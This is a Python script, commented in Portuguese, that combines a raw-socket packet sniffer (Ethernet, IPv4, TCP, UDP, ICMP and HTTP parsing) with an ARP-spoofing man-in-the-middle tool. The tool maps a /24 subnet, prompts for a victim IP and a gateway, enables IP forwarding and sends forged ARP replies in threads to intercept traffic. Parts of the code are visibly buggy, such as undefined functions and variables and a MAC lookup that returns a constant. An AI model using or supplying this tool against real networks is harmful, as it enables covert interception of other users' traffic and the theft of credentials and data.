import socket
import struct #faz o unpack da data para bytes
import time
import textwrap #texto bonito
import shutil
from scapy.all import *
import sys, os, time
from uuid import getnode as get_mac
from termcolor import colored
import threading
os.system("clear")


class TCP:
    def __init__(self, raw_data):
        (self.src_port, self.dest_port, self.sequence, self.acknowledgment, offset_reserved_flags) = struct.unpack('! H H L L H', raw_data[:14]) # H que significa small unsiged int e sao 2 bytes e o large que vale 4bytes
        offset = (offset_reserved_flags >> 12) * 4 # ve a flag reserved, faz o shift de 12 bits *4
        #print(offset_reserved_flags)
        print(offset_reserved_flags >> 12)
        #time.sleep(100)
        self.flag_urg = (offset_reserved_flags & 32) >> 5 #nformar a rececao de dados dq  sao urgentes e devem ser priorizados
        self.flag_ack = (offset_reserved_flags & 16) >> 4 #ackno
        self.flag_psh = (offset_reserved_flags & 8) >> 3 #push informa o host que a data deve ser pushed p a aplicacao
        self.flag_rst = (offset_reserved_flags & 4) >> 2 #aborta a conneccao em resposta a um erro
        self.flag_syn = (offset_reserved_flags & 2) >> 1 #syn
        self.flag_fin = offset_reserved_flags & 1 #fin
        self.data = raw_data[offset:] #a data vai desde o offset até ao fim

class UDP:
    def __init__(self, raw_data):
        self.src_port, self.dest_port, self.size = struct.unpack('! H H 2x H', raw_data[:8])
        self.data = raw_data[8:]

class Ethernet:
    def __init__(self, raw_data):

        dest, src, prototype = struct.unpack('! 6s 6s H', raw_data[:14]) # 6s para a source, 6 para o destination e H que significa small unsiged int e so precisamos dos primeros 14 bytes da frame ou seja 6+6+2 do small int

        self.dest_mac = get_mac_addr(dest)
        self.src_mac = get_mac_addr(src)
        self.proto = socket.htons(prototype) #htons e um metodo relacionado com o amll e big endian para ver a ordem dos bytes e o htons vai fazer com que seja compativel dependendo da forma que queremos ler
        self.data = raw_data[14:]

class HTTP:
    def __init__(self, raw_data):
        try:
            self.data = raw_data.decode('utf-8')
        except:
            self.data = raw_data
class ICMP:
    def __init__(self, raw_data):
        self.type, self.code, self.checksum = struct.unpack('! B B H', raw_data[:4])# o ponto de exclamacao vai servir para converter de big endian para little endian (ordem de representacao), endia trata de um formato de como os bytes vao pela net, desta forma vai ser compativel com todos os sistemas, B e 1 byte e H 2
        self.data = raw_data[4:] #o resto da data é do 4 até ao final


class IPv4:
    def __init__(self, raw_data):
        version_header_length = raw_data[0]  #vai saber a versao dp byte na posicao[0] que e a versao
        #for x in raw_data[:32]:
        	#print (x)
        total_length = raw_data[3]

        #print(version_header_length)
        #time.sleep(100)

        self.version = version_header_length >> 4 #versão no hearder com 4 bytes os >> faz com que ande com a memoria 4 bytes
        self.header_length = (version_header_length & 15) * 4
        self.ttl, self.proto, src, target = struct.unpack('! 8x B B 2x 4s 4s', raw_data[:20]) # vai dar o formato em que a data vai ser unpacked. o ponto de exclamacao vai servir para converter de big endian para little endian (ordem de representacao), endia trata de um formato de como os bytes vao pela net, desta forma vai ser compativel com todos os sistemas
        self.src = self.ipv4(src) #a source
        self.target = self.ipv4(target) #destination
        self.data = raw_data[self.header_length:] # data itself
    # Returns properly formatted IPv4 address
    def ipv4(self, addr):
        return '.'.join(map(str, addr))



# Return do  MAC
def get_mac_addr(mac_raw):
    byte_str = map('{:02x}'.format, mac_raw) # funcao map  aplica a ua lista de imputs uma função, ou seja vai formatar cada parte do mac para 2 decimais
    mac_addr = ':'.join(byte_str).upper() #: vai fazer join dos bytes dividios por ":" e maiusculas
    return mac_addr


# Formats multi-line data
def textobonito(prefix2, string):
    if isinstance(string, bytes): #a funcao isinstance() checa se primeiro argumento e da classe do segundo)
        string = ''.join(r'\x{:02x}'.format(byte) for byte in string)
    cenas='\n'.join([prefix2+line for line in textwrap.wrap(string, 80)]) #textwrap serve para formatar texto em que se da o que se deve formatar e o tamanha que queremos, neste caso faz um \n w cada linha de 80 em 80
    return cenas


def imprimeframe():
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3)) #socket para ter conexão, ntohs faz com que seja compativel com todas is sistemas, relacionato com o bg e small endian

    while True:
        raw_data, addr = conn.recvfrom(65535) #maior buffer possivel
        eth = Ethernet(raw_data)

        print('\nEthernet Frame:')
        print('\t Destination: {}, Source: {}, Protocol: {}'.format(eth.dest_mac, eth.src_mac, eth.proto))

        #protocol vai devolver um numero sendo que
        # 1=iCMP
        # 2=IGMP
        # 6=TCP
		# 9=EGRP
		# 17=UDP



        # IPv4
        if eth.proto == 8:
            ipv4 = IPv4(eth.data)
            print('\tIPv4 Packet:')
            print('\t\tVersion: {}, Header Length: {}, TTL: {},'.format(ipv4.version, ipv4.header_length, ipv4.ttl))
            print('\t\tProtocol: {}, Source: {}, Target: {}'.format(ipv4.proto, ipv4.src, ipv4.target))

            #a data que esta dentro podera advir de protocolos como icmp ou tcp ou udp

            # ICMP
            if ipv4.proto == 1:
                icmp = ICMP(ipv4.data)
                print('\tICMP Packet:')
                print('\t\tType: {}, Code: {}, Checksum: {},'.format(icmp.type, icmp.code, icmp.checksum))
                print('\t\tICMP Data:')
                print(format_multi_line('\t\t\t',icmp.data))

            # TCP
            elif ipv4.proto == 6:
                tcp = TCP(ipv4.data)
                print('\tTCP Segment:')
                print('\t\tSource Port: {}, Destination Port: {}'.format(tcp.src_port, tcp.dest_port))
                print('\t\tSequence: {}, Acknowledgment: {}'.format(tcp.sequence, tcp.acknowledgment))
                print('\t\tFlags:')
                print('\t\t\tURG: {}, ACK: {}, PSH: {}'.format(tcp.flag_urg, tcp.flag_ack, tcp.flag_psh))
                print('\t\t\tRST: {}, SYN: {}, FIN:{}'.format(tcp.flag_rst, tcp.flag_syn, tcp.flag_fin))

                if len(tcp.data) > 0: # se a data contiver alguma coisa

                    # HTTP
                    if tcp.src_port == 80 or tcp.dest_port == 80: # se o porto de source ou de destino for o 80
                        print('\t\tHTTP Data:')
                        try:
                            http = HTTP(tcp.data)
                            http_info = str(http.data).split('\n')
                            for line in http_info:
                                print('\t\t\t', str(line))
                        except:
                            print('\t\t\t', tcp.data,"\n")
                    else:
                        print('\t\tTCP Data:')
                        #print("\t\t\t",tcp.data,"\n")
                        print(textobonito('\t\t\t', tcp.data))

            # UDP
            elif ipv4.proto == 17:
                udp = UDP(ipv4.data)
                print('\tUDP Segment:')
                print('\t\tSource Port: {}, Destination Port: {}, Length: {}'.format(udp.src_port, udp.dest_port, udp.size))

            # Other IPv4
            else:
                print('\tOther IPv4 Data:')
                #print("\t\t\t",ipv4.data,"\n")
                print(textobonito('\t\t', ipv4.data))

        else:
            print('Ethernet Data:')
            #print("\t\t\t",eth.data,"\n")
            print(textobonito('\t\t', eth.data))





#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


def mapnet(): #Mapeia a network
    lista = [] #Lista com os mac la dentro
    macfind = arping("192.168.100.0/24",verbose=0) #Descobrir os macs
    for x in range (100): #Até 100
        try:
            lista.append(macfind[0][x][0].pdst) #Appenda so o mac
        except:
            break
    if lista == []:
        pass
    else:
        mitm2(lista) #Começa o man in the middle

def mitm2(macs): #Man in the middle ed network
    gateway = input("Qual o ip de gateway?\nIP:")
    while True:
        for VIPadd in macs: #Corre todos os IPaddr nos macs
            try:
                VMac = getMac(VIPadd)
            except: #Se ocorre um erro da disable em ip forwarding
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print("[!] Ocorreu um erro, adeus!")
                sys.exit(1)
            try:
                GateMAC = getMac(gateway)
                MyGate = "3C:52:82:6A:69:09"
            except:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print("[!] Ocorreu um erro, adeus!")
                sys.exit(1)
            os.system("clear")
            print(colored("[+]",'green')+"Starting thread on target: {}".format(VIPadd))
            if VIPadd == gateway:
                pass
            try: #Começa as threads
                t = threading.Thread(target = trick, args=(MyGate, VMac ,GateMAC,VIPadd))
                t.daemon = True
                t.start()
                time.sleep(1.2)
            except KeyboardInterrupt:
                try:
                    opc=input("Voltar?[y/n]")
                    if opc=="y":
                        menu()
                    else:
                        reARP()
                        break

                except KeyboardInterrupt:
                    reARP()
                    break

def getMac(ip): #Obtem o mac addr de um so ip
    try:
        os.system("arping -c 1 -I eth0 "+ip+" > ./Macs.txt")
        file = open("Macs.txt","r")
        lista = file.readlines()
        lista = lista[1].split()
        lista = lista[3]
        file.close()
        os.system("rm ./Macs.txt")
        return 1
    except:
        os.system("clear")
        print(" [!] Djabei!")
        sys.exit(1)

def reARP(): #Devolve a arp table dos victims
    os.system("clear")
    print("reArping...")
    VMac = getMac(VIPadd)
    GateMAC = getMac(gateway)
    send(ARP(op = 2, pdst = gateway, psrc = VIPadd, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = VMac), count = 7)
    send(ARP(op = 2, pdst = gateway, psrc = VIPadd, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = GateMAC), count = 7)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print(" [!] Acabou!")
    sys.exit(1)

def trick(gm, vm, go,VIPadd): #É o que engana os clientes
    while True:
        gateway = "192.168.100.1"
        send(ARP(op = 2, pdst = VIPadd, psrc = gateway, hwsrc = gm),verbose = 0)
        send(ARP(op = 2, pdst = gateway, psrc = VIPadd, hwsrc = gm),verbose = 0)
        time.sleep(3)

def mitm(VIPadd): #Man in the middle a so uma pessoa
    try:
        VMac = getMac(VIPadd)
    except:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print(" [!] Djabei!")
        sys.exit(1)
    try:
        gateway=input("[*]Qual é o ip de gateway?\n[*]IP:")
        GateMAC = getMac(gateway)
        MyGate = "3C:52:82:6A:69:09"
    except:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print(" [!] Djabei!")
        sys.exit(1)
    print(" [+]Starting thread on target:")
    print(VIPadd)
    if 1==1:
        try:
            t = threading.Thread(target = trick , args=(MyGate, VMac ,GateMAC,VIPadd))
            t.daemon = True
            t.start()
            return 1
        except KeyboardInterrupt:
            reARP()
            #break
def menu():
    try:
        os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
        opc = ""
        while True:
            os.system("clear")
            print("\t\t[+] ------------------------SNIFFER-------------------------- [+]")
            print("\t\t[+]                                                           [+]")
            print("\t\t[+]   			 1-SNIFFA REDE/ ARP                   [+]")
            print("\t\t[+]   			 2-SNIFF MYSELF                       [+]")
            print("\t\t[+]   		         0-Sair                               [+]")
            print("\t\t[+]                                                           [+]")
            print("\t\t[+]-----------------------------------------------------------[+]")
            opc = input("\t\t[Option] >> ")
            if opc == "2":
                imprimeframe()
            elif opc == "0":
                os.system("clear")
                sys.exit(1)
            elif opc == "1":
                os.system("clear")
                while True:
                    #os.system("clear")
                    print(" [+]------------ARP----------[+]")
                    print(" [+]        1-NETWORK        [+]")
                    print(" [+]        2-IP             [+]")
                    print(" [+]        0-VOLTAR         [+]")
                    print(" [+]-------------------------[+]")

                    opc = input(" [insere opcao] >> ")
                    if opc == "0":
                        os.system("clear")
                        break
                    elif opc == "2":
                        os.system("clear")
                        prefix = "192.168.100."
                        VIPadd = input("[+] ip da vitima: 192.168.100.")
                        VIPadd = prefix.replace("\n","") + VIPadd.replace("\n","")
                        gateway = prefix.replace("\n","") + ("1")
                        mitm(VIPadd)
                    elif opc == "1":
                        os.system("clear")
                        mapnet()
                    else:
                        os.system("clear")
                        print(colored(" [!] INVALID INPUT [!]",'red'))

    except KeyboardInterrupt:
        print(" [!] Exiting...")
        print(" [!] Shutdown!")
        os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.exit(1)

menu()
